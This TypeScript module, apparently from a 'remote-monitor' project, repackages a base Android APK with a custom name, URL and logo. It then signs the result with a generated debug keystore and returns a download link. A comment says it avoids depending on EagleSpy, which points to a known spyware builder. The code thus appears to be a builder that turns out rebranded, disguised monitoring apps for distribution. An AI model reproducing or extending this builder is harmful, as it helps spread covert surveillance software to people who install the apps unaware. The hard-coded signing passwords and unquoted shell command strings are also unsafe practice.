import fs from 'fs';
import * as path from 'path';
import { execSync } from 'child_process';
import archiver from 'archiver';

interface APKBuildOptions {
  appName: string;
  appUrl: string;
  logoUrl?: string;
}

/**
 * Builder SIMPLES - Sem dependência de EagleSpy
 * Usa apenas unzip/zip + jarsigner
 * Funciona em produção e desenvolvimento
 */
export async function buildSimpleAPK(options: APKBuildOptions): Promise<{
  success: boolean;
  filename?: string;
  downloadUrl?: string;
  error?: string;
}> {
  try {
    const apksDir = process.env.NODE_ENV === 'production' 
      ? '/app/public/apks'
      : '/home/ubuntu/remote-monitor/public/apks';
    
    // Encontrar APK base
    const files = fs.readdirSync(apksDir);
    const baseAPKFile = files.find(f => f.startsWith('base-') && f.endsWith('.apk'));
    
    if (!baseAPKFile) {
      return {
        success: false,
        error: 'APK base não encontrado'
      };
    }
    
    const baseAPK = path.join(apksDir, baseAPKFile);
    const timestamp = Date.now();
    const randomSuffix = Math.random().toString(36).substring(2, 8);
    const sanitizedName = options.appName
      .replace(/[^a-zA-Z0-9-]/g, '-')
      .replace(/-+/g, '-')
      .toLowerCase();
    const filename = `${sanitizedName}-${timestamp}-${randomSuffix}.apk`;
    const outputPath = path.join(apksDir, filename);
    
    console.log('[SIMPLE-BUILD] Iniciando build simples:', { baseAPK, outputPath });
    
    const tempDir = `/tmp/simple-build-${timestamp}-${randomSuffix}`;
    const extractDir = path.join(tempDir, 'extracted');
    
    try {
      // Desempacotar APK base
      console.log('[SIMPLE-BUILD] Desempacotando APK...');
      execSync(`mkdir -p ${extractDir}`);
      execSync(`unzip -q ${baseAPK} -d ${extractDir}`);
      
      // Adicionar configuração em assets
      const assetsDir = path.join(extractDir, 'assets');
      fs.mkdirSync(assetsDir, { recursive: true });
      
      const config = {
        appName: options.appName,
        appUrl: options.appUrl,
        logoUrl: options.logoUrl || '',
        customized: true,
        timestamp: Date.now(),
      };
      
      const configPath = path.join(assetsDir, 'app-config.json');
      fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
      console.log('[SIMPLE-BUILD] Config adicionada');
      
      // Reempacotar com archiver
      console.log('[SIMPLE-BUILD] Reempacotando APK...');
      const repacked = path.join(tempDir, 'app-unsigned.apk');
      await new Promise<void>((resolve, reject) => {
        const output = fs.createWriteStream(repacked);
        const archive = archiver('zip', { zlib: { level: 9 } });
        
        output.on('close', () => {
          console.log('[SIMPLE-BUILD] APK reempacotado:', archive.pointer(), 'bytes');
          resolve();
        });
        
        output.on('error', reject);
        archive.on('error', reject);
        
        archive.pipe(output);
        archive.directory(extractDir, false);
        archive.finalize();
      });
      
      // Alinhar
      console.log('[SIMPLE-BUILD] Alinhando APK...');
      const aligned = path.join(tempDir, 'app-aligned.apk');
      execSync(`zipalign -f -v 4 ${repacked} ${aligned}`);
      
      // Assinar
      console.log('[SIMPLE-BUILD] Assinando APK...');
      const keystorePath = path.join(apksDir, 'debug.keystore');
      if (!fs.existsSync(keystorePath)) {
        execSync(
          `keytool -genkey -v -keystore ${keystorePath} -keyalg RSA -keysize 2048 ` +
          `-validity 10000 -alias android -storepass android -keypass android ` +
          `-dname "CN=Android, OU=Dev, O=Dev, L=Dev, S=Dev, C=US"`,
          { stdio: 'pipe' }
        );
      }
      
      execSync(
        `jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 ` +
        `-keystore ${keystorePath} -storepass android -keypass android ` +
        `${aligned} android`,
        { stdio: 'pipe' }
      );
      
      // Copiar para output
      fs.copyFileSync(aligned, outputPath);
      
      // Limpar
      execSync(`rm -rf ${tempDir}`);
      
      console.log('[SIMPLE-BUILD] APK construído com sucesso');
      
      const downloadUrl = `https://${process.env.VITE_APP_DOMAIN || 'localhost:3000'}/get-apk/${filename}`;
      
      return {
        success: true,
        filename,
        downloadUrl
      };
    } catch (err) {
      console.error('[SIMPLE-BUILD] Erro durante build:', err);
      try {
        execSync(`rm -rf ${tempDir}`);
      } catch (e) {
        // Ignorar erro ao limpar
      }
      
      return {
        success: false,
        error: err instanceof Error ? err.message : 'Erro desconhecido'
      };
    }
  } catch (error) {
    console.error('[SIMPLE-BUILD] Erro:', error);
    return {
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error'
    };
  }
}
